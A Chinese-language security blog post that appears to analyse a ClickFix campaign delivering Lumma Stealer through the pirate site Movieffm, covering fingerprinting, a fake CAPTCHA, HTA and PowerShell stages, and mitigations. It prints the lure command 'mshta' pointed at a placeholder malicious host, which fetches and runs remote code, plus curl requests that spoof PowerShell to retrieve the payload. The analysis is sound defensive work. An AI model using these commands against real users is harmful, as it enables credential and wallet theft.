---
layout: post
title: "惡意程式分析報告：透過盜版影音網站 Movieffm 散播的 Lumma Stealer 攻擊活動 "
subtitle: ""
date: 2025-09-03
author: "Peter"
header-img: "img/post-bg-hack.jpg"
tags: [資安, 惡意程式分析, lumma stealer, clickfix]
---

本報告旨在分析一起利用盜版影音網站 Movieffm 進行的惡意軟體攻擊活動。攻擊者首先在該網站中植入混淆的 JavaScript 腳本。該腳本會對訪問者進行瀏覽器指紋辨識 (Fingerprinting)，針對符合條件的目標，觸發一個偽裝成 CAPTCHA 的惡意釣魚頁面。

此釣魚頁面會誘導使用者複製並執行一段 `mshta.exe` 指令，以下載並執行一個 HTA (HTML Application) 檔案。後續的攻擊鏈中，攻擊者再次利用 User-Agent 指紋辨識技術，確保只有來自 PowerShell 的請求才能接收到最終的 Lumma Stealer 惡意腳本 。

一旦 Lumma Stealer 成功執行，它將竊取受害者電腦中的瀏覽器紀錄、加密貨幣錢包、系統憑證等敏感資料，並回傳至攻擊者的 C2 (Command and Control) 伺服器。建議使用者應避免訪問高風險網站，並採用具備惡意網站過濾功能的瀏覽器或安全插件，以降低此類攻擊的風險。

## 一、攻擊鏈分析 (Attack Chain Analysis)

### 階段一：初始入侵與前端腳本植入

分析顯示，Movieffm 網站的頁面中被植入了外部 JavaScript 腳本。經分析，此腳本會動態向遠端伺服器請求並載入一段經過高度混淆的程式碼。

前端腳本
![movieffm javascript](/img/in-post/movieLumma/image-3.png)

該腳本的主要功能是動態建構並發出一個請求，用以載入更複雜的遠端 JavaScript 腳本。透過 Burp Suite 進行流量攔截，可以看到伺服器回應的 JavaScript 內容經過高度混淆。

前端回傳的 javascript response
![burp response](/img/in-post/movieLumma/image-4.png)

初步分析這份龐大的混淆腳本後，確認其核心功能之一是進行使用者 Fingerprinting。透過分析使用者的環境以精準投放 payload 或規避網路或防毒軟體的偵查。

對惡意腳本所在的伺服器 IP 進行 `dig` 與 `shodan` 調查，僅能確認其由 `servers.com` 提供服務，並架設於 Nginx 上，顯示攻擊者利用了常見的託管服務來隱藏其真實基礎設施。
![shodan](/img/in-post/movieLumma/image-6.png)

### 階段二：社交工程與惡意指令傳遞

符合特定指紋的訪問者會被重新導向至一個 CAPTCHA 驗證的釣魚頁面，此頁面託管於 Cloudflare 保護的網域後方，且每次訪問的網域名稱皆不相同，增加了追蹤的難度。

![alt text](/img/in-post/movieLumma/image-8.png)

> 此攻擊手法並非首例，這個手法被稱作 ClickFix ，常伴隨 Lumma Stealer 。詳情可參閱[此連結][1]。

此釣魚頁面的網址每次都不同，但透過 WHOIS 查詢，均發現其利用 Cloudflare 進行反向代理，增加了追蹤其來源伺服器的難度。

whois 查詢結果
![whois-cloudflare](/img/in-post/movieLumma/image-14.png)

當使用者點擊頁面上的 "I'm not a robot" 核取方塊時，網頁會執行一段 JavaScript，將一串惡意指令複製到使用者的剪貼簿中，並同時跳出一個彈窗，指示使用者按下 Ctrl + R（或 Cmd + R），然後貼上並執行指令。

頁面誘騙使用者點擊「I'm not a robot」按鈕。
![alt text](/img/in-post/movieLumma/image-9.png)

被複製的指令如下
```powershell
mshta http://malicious.site/gbg7/rhfb.c
```

> mshta.exe 是 Windows 內建的合法程式，常用於執行 HTA 檔案，但也因此成為攻擊者執行任意程式碼的常見「離地攻擊」(Living-off-the-Land) 手段。關於更多請參照[連結][2]。


### 階段三：Payload 下載與執行

為了分析 `mshta` 將要執行的內容，我們使用 `curl` 工具直接請求該 HTA 檔案。
```bash
curl -i "http://malicious.site/gbg7/rhfb.c"
```
![alt text](/img/in-post/movieLumma/image-11.png)

伺服器回傳的 HTA 檔案內容非常簡短，其核心是執行一段 PowerShell 指令，以下載並執行另一個遠端腳本。

當我們嘗試直接用 curl 訪問 PowerShell 將要下載的 URL時，卻發現請求被重新導向到無害的 Steam 網站，暗示伺服器端存在額外的檢查機制。

curl 返回結果為 redirect
![curl fingerprinting](/img/in-post/movieLumma/image-12.png)

我們推測伺服器會驗證請求的 User-Agent。因此，我們在 curl 指令中模擬 PowerShell 的 User-Agent 再次發出請求：
```bash
curl -s -X GET "http://malicious.site/gbg7/" -H "User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1320"
```

這次，伺服器成功回傳了真正的惡意 PowerShell 腳本，只有來自受害者機器上 PowerShell 程式的流量才會收到惡意 payload，而來自普通瀏覽器或分析工具的請求則會被另外重新導向。

模擬 powershell 結果為惡意腳本
![powershell user agent response](/img/in-post/movieLumma/image-13.png)

### 階段四：最終目標 - Lumma Stealer 資訊竊取軟體

我們將取得的 PowerShell 腳本上傳至 `any.run` 沙盒環境進行動態分析。

分析報告確認，該腳本的最終 payload 為 Lumma Stealer，這是一款知名的資訊竊取惡意軟體。一旦執行，它會掃描受感染的電腦，竊取儲存在瀏覽器中的敏感資料（如密碼、Cookies、信用卡資訊）、加密貨幣錢包、系統資訊等，並將所有資料打包後傳送到攻擊者的 C2 (Command & Control) 伺服器。

沙盒分析連結: [https://app.any.run/tasks/29c82282-2320-4c94-9529-b5591287fe03][https://app.any.run/tasks/29c82282-2320-4c94-9529-b5591287fe03]]

![any.run result](/img/in-post/movieLumma/image-15.png)


## 緩解與建議
為防範此類攻擊，建議使用者採取以下措施：

避免使用盜版或不受信任的網站服務：正版服務通常具備更完善的安全維護，較不易成為惡意程式的溫床。

使用具備防護功能的瀏覽器與擴充套件：

- 瀏覽器如 Microsoft Edge 內建的 SmartScreen 或 Google Chrome 的安全瀏覽 (Safe Browsing) 功能，能有效阻擋已知的惡意網站。
- 安裝如 uBlock Origin 等廣告攔截器，能有效阻止惡意的彈出視窗和腳本執行。

保持高度警覺，切勿執行來路不明的指令：任何引導你在終端機、PowerShell 或執行對話框中輸入的指令，都可能對你的電腦造成無法挽回的損害。務必對這類要求保持懷疑。

## 責任通報與生態系防禦
本次分析中相關連結已向相關單位通報。 

servers.com
![alt text](/img/in-post/movieLumma/image-16.png)

sollutium-nl
![alt text](/img/in-post/movieLumma/image-18.png)

movieffm.net
![alt text](/img/in-post/movieLumma/image-19.png)

## 附錄：樣本資訊
本次分析過程中發現的相關腳本與樣本已整理至以下 GitHub repo：
https://github.com/PPKan/malware_samples/tree/main/movieffm_samples


[1]:https://www.trendmicro.com/zh_tw/research/25/g/lumma-stealer-returns.html
[2]:https://www.cnblogs.com/backlion/p/10491616.html
